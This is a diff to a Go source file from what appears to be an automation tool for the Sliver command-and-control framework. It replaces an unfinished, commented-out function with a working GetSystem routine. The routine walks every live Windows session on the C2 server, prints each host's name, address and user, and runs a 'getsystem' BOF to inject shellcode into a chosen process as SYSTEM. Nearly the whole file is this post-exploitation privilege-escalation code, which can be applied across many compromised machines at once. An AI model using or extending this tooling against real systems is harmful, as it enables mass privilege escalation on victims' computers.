@@ -1,73 +1,48 @@
 package dispatch
 
-// import (
-// 	"context"
-// 	"fmt"
-// 	"log"
-// 	"os"
-// 	"strings"
+import (
+	"context"
+	"fmt"
+	"sliver-dispatch/utils"
+	"strings"
 
-// 	"github.com/bishopfox/sliver/protobuf/clientpb"
-// 	"github.com/bishopfox/sliver/protobuf/commonpb"
-// 	"github.com/bishopfox/sliver/protobuf/rpcpb"
-// 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-// 	"github.com/bishopfox/sliver/server/core"
-// 	"google.golang.org/protobuf/proto"
-// )
+	"github.com/bishopfox/sliver/protobuf/clientpb"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/rpcpb"
+)
 
-// func GetSystem(rpc rpcpb.SliverRPCClient, args ...string) {
+func GetSystem(rpc rpcpb.SliverRPCClient, args ...string) {
 
-// 	if len(args) < 2 {
-// 		fmt.Println("Need the full path to sliver shellcode and a system process name to inject to.")
-// 		return
-// 	}
+	if len(args) < 2 {
+		fmt.Println("Need the full path to shellcode and process name to spawn to (as system).")
+		return
+	}
 
-// 	b_shc, err := os.ReadFile(args[0])
-// 	if err != nil {
-// 		fmt.Println("Error reading file:", err)
-// 		return
-// 	}
-// 	var sessions *clientpb.Sessions
+	path_shc := args[0]
+	processName := args[1]
 
-// 	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
-// 	if err != nil {
-// 		log.Fatal(err)
-// 	}
+	var sessions *clientpb.Sessions
+	var err error
+	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
+	if err != nil {
+		utils.Eprint("Error listing sessions: %s", err.Error())
+	}
 
-// 	var session *clientpb.Session
-// 	var shellcode_task *sliverpb.Task
-// 	for _, session = range sessions.GetSessions() {
-// 		if !session.IsDead && session.OS == "windows" {
+	var session *clientpb.Session
+	for _, session = range sessions.GetSessions() {
+		if !session.IsDead && session.OS == "windows" {
 
-// 			fmt.Println(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
-// 				strings.Split(session.ID, "-")[0],
-// 				session.Hostname,
-// 				strings.Split(session.RemoteAddress, ":")[0],
-// 				session.Username))
+			utils.Iprint(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
+				strings.Split(session.ID, "-")[0],
+				session.Hostname,
+				strings.Split(session.RemoteAddress, ":")[0],
+				session.Username))
 
-// 			var req []byte
-// 			req, err = proto.Marshal(&sliverpb.InvokeGetSystemReq{
-// 				Data:           b_shc,
-// 				HostingProcess: args[1],
-// 				Request: &commonpb.Request{
-// 					Async:     false,
-// 					SessionID: session.ID,
-// 				},
-// 			})
+			status := utils.BofExec("getsystem", []string{processName, path_shc}, session, rpc)
+			if status == utils.BOF_ERR_OTHER {
+				return
+			}
 
-// 			rpc.
-
-// 			if err != nil {
-// 				fmt.Println("Error: " + shellcode_task.Response.Err)
-// 			}
-
-// 			parsed := &sliverpb.GetSystem{}
-// 			err = proto.Unmarshal(getsys_resp, parsed)
-
-// 			if parsed.Response != nil {
-// 				fmt.Println("Response: " + parsed.Response.String())
-// 			}
-
-// 		}
-// 	}
-// }
+		}
+	}
+}
